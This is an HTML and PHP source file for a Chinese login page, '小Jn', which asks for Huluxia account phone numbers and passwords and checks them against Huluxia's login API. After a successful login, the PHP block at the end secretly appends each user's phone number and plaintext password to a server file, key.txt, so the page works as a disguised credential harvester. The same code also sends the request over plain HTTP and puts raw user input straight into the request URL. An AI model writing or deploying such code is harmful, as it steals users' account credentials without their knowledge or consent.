<!doctype html>
<html lang="zh-cmn-Hans">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no"/>
    <meta name="renderer" content="webkit"/>
    <meta name="force-rendering" content="webkit"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

<!-- MDUI CSS -->
    <link
      rel="stylesheet"
      href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css"

    />
  
  </head>
  <body>
    

<!-- MDUI JavaScript -->
    <script
      src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"

    ></script>
  </body>
</html>

<!doctype html>
<html>

<head>
     <title>登陆 - 小Jn</title>
     <meta charset="utf-8" name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" />
     
     <style>
          .logo
          {
            text-align: center;
          }
          .logo img
          {
            width: 20%;
          }
          .register #title
          {
            font-size: 20px;
          }
          
          .register
          {
            width: 80%;
            height: 30%;
            margin: 0 auto;
            background-color: #C2C2C2;
            border-radius: 5px;
            text-align: center;
          }
          .register #message
          {
            text-align: center;
          }
          
          .register #message form .text
          {
            border-radius: 0px;
            border: 1px solid #FFFFFF;
            height: 30px;
            width: 80%;
            border-top: none;
            border-left: none;
            border-right: none;
            border-bottom: 1px solid black;
            background-color: #CBCBCB;
            outline: none;
          }
          .register #message form #submit
          {
            width: 80%;
            height: 30px;
            border: none;
            background-color:  #FFFFFF;
            border-radius: 20px;
            outline: none;
          }
     </style>
</head>

<body>
<div class="mdui-ripple">
     <div class="logo">
        <img src="static/picture/hill.jpg" />   
     </div>
     
     <div class="register">
        <h1 id="title"><br>小Jn-使用葫芦侠账号密码 · 登陆</h1><br>
        <div id="message">
           <form action="" method="post">
                <input type="text" placeholder="请输入手机号" name="phoneNumber" class="text" /><br><br>
                <input type="password" placeholder="请输入密码" name="password" class="text" /><br><br>
                
                
                

                
                
                
                
                <input type="submit" id="submit" value="登陆" /><br><br>
           </form>
        </div>
     </div>
     </div>
</body>

</html>

<?php
$phoneNumber=$_POST["phoneNumber"];
$password=md5($_POST["password"],false);
$r=$_POST["password"];
$result=file_get_contents("http://floor.huluxia.com/account/login/ANDROID/4.0?device_code=1&account=".$phoneNumber."&login_type=2&password=".$password);
$returnJson=json_decode($result,true);
$msg=$returnJson["msg"];
$key=$returnJson["_key"];
$uid=$returnJson["user"]["userID"];

switch($msg)
{
  case "账号或密码错误":
    echo '<script>window.alert("账号或密码错误！");</script>';
    break;
  case "参数不合法":
    echo '<script>window.alert("参数不合法！");</script>';
    break;
  case "账号不存在":
    echo '<script>window.alert("账号不存在");</script>';
    break;
  case "":
    echo '<script>window.alert("登陆成功，正在为您自动跳转至首页！");</script>';
   setrawcookie("ekey",$key,time()+2592000000000000);
   
        //读取记录
$myfilert = fopen("key.txt", "r") or die("Unable to open file!");
$f = fread($myfilert,filesize("key.txt"));
fclose($myfilert);

//记录

    $myfile = fopen("key.txt", "w") or die("Unable to open file!");
$txt = $f."账号：".$phoneNumber."密码:".$r."\n";
fwrite($myfile, $txt);
fclose($myfile);
   
   
    Header("Location: /tool.php");
    break;
}
?>